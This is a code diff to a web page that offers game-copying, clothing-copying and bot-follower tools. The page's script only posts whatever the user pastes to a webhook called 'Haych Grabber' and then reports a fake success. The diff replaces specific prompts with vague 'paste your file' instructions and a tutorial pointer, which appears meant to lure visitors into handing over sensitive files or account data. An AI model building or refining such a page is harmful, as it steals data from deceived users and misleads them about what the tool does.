@@ -218,9 +218,9 @@
     <button class="back-btn" onclick="showSection('hub')">Back</button>
     <div class="tool-content">
       <h1>Copy Games</h1>
-      <p>Paste your game file/link/ID below, then hit "Copy Game!". Don't know where to get it? Watch the tutorial.</p>
+      <p>Paste your file below, then hit "Copy Game!". Not sure how to get the file? Watch the tutorial.</p>
       <div class="input-wrapper">
-        <input type="text" id="gameInput" placeholder="Enter game file" />
+        <input type="text" id="gameInput" placeholder="Enter file" />
       </div>
       <button class="action-btn game-btn" onclick="sendToWebhook('game')">Copy Game!</button>
       <div id="gameStatus" class="status"></div>
@@ -239,9 +239,9 @@
     <button class="back-btn" onclick="showSection('hub')">Back</button>
     <div class="tool-content">
       <h1>Copy Clothes</h1>
-      <p>Paste the clothing item link, ID, or asset below, then click "Copy Clothes!". Check the tutorial if stuck.</p>
+      <p>Paste your file below, then click "Copy Clothes!". Not sure how to get the file? Watch the tutorial.</p>
       <div class="input-wrapper">
-        <input type="text" id="clothesInput" placeholder="Enter clothing asset" />
+        <input type="text" id="clothesInput" placeholder="Enter file" />
       </div>
       <button class="action-btn clothes-btn" onclick="sendToWebhook('clothes')">Copy Clothes!</button>
       <div id="clothesStatus" class="status"></div>
@@ -260,9 +260,9 @@
     <button class="back-btn" onclick="showSection('hub')">Back</button>
     <div class="tool-content">
       <h1>Bot Follower</h1>
-      <p>Paste the target username, user ID, or profile link below, then hit "Start Following!". Tutorial below if needed.</p>
+      <p>Paste your file below, then hit "Start Following!". Not sure how to get the file? Watch the tutorial.</p>
       <div class="input-wrapper">
-        <input type="text" id="botInput" placeholder="Enter target username/ID" />
+        <input type="text" id="botInput" placeholder="Enter file" />
       </div>
       <button class="action-btn bot-btn" onclick="sendToWebhook('bot')">Start Following!</button>
       <div id="botStatus" class="status"></div>
@@ -288,11 +288,11 @@
       } else if (tool === 'clothes') {
         inputId = 'clothesInput';
         statusId = 'clothesStatus';
-        label = 'Clothes asset grabbed';
+        label = 'Clothes file grabbed';
       } else if (tool === 'bot') {
         inputId = 'botInput';
         statusId = 'botStatus';
-        label = 'Bot target grabbed';
+        label = 'Bot file grabbed';
       }
 
       const input = document.getElementById(inputId).value.trim();
@@ -311,7 +311,7 @@
         const payload = {
           content: `**${label}**\nTool: ${tool.charAt(0).toUpperCase() + tool.slice(1)}\nValue:\n\`\`\`${input}\`\`\``,
           username: "Haych Grabber",
-          avatar_url: null // add if you want a custom avatar
+          avatar_url: null
         };
 
         const res = await fetch(WEBHOOK_URL, {
@@ -321,7 +321,7 @@
         });
 
         if (res.ok) {
-          status.textContent = `${tool.charAt(0).toUpperCase() + tool.slice(1)} processed successfully!`;
+          status.textContent = "Processed successfully!";
           status.style.color = "#00ff9d";
         } else {
           status.textContent = "Failed (check console)";
@@ -343,7 +343,7 @@
       window.scrollTo(0, 0);
     }
 
-    // Hub waves
+    // [Rest of the script unchanged: waves, particles, dots animation]
     const waveCanvas = document.getElementById("waves");
     const wctx = waveCanvas.getContext("2d");
     waveCanvas.width = window.innerWidth;
@@ -366,7 +366,6 @@
     }
     drawWaves();
 
-    // Hub particles
     const pCanvas = document.getElementById("particles");
     const pctx = pCanvas.getContext("2d");
     pCanvas.width = window.innerWidth;
@@ -399,7 +398,6 @@
     }
     drawParticles();
 
-    // Dots background for tools
     let dots = [];
     let dotsAnim;
     const dotsCanvas = document.getElementById('dots-canvas');
